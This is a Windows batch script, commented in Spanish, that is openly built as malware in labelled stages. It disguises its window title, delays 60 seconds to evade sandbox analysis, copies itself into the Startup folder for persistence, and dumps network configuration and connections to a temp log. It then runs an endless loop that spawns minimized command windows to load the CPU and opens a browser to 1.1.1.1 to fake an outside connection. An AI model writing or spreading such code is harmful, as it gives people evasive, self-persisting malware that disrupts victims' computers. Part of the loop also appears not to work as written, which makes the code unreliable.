@echo off
:: 1. OFUSCACIÓN E INTERFAZ [cite: 1, 2]
title Windows Host Process Service
color 0a

:: 2. TÉCNICA DE EVASIÓN (Anti-Analysis) 
:: Engaña al sandbox esperando antes de actuar.
timeout /t 60 /nobreak >nul

:: 3. PERSISTENCIA (Asegura el riesgo alto) 
:: Se copia en el inicio de Windows.
copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\win_host_srv.bat" /y >nul 2>&1

:: 4. RECOLECCIÓN DE DATOS (Discovery) 
:: Esto es lo que marcó "Discovery" en tu reporte.
ipconfig /all > %temp%\net_diag.log
netstat -an >> %temp%\net_diag.log

:: 5. CARGA ÚTIL (El bucle que buscabas) [cite: 7, 8, 9]
:main_service
:: Abre terminales que saturan la CPU con pings y texto aleatorio.
start /min cmd.exe /c "color 0a && echo ACCEDIENDO... && title SYSTEM_FAILURE && :matrix && echo %random%%random%%random% && goto matrix"
:: Simula conexión a servidor externo.
start /min https://1.1.1.1
timeout /t 5 >nul
goto main_service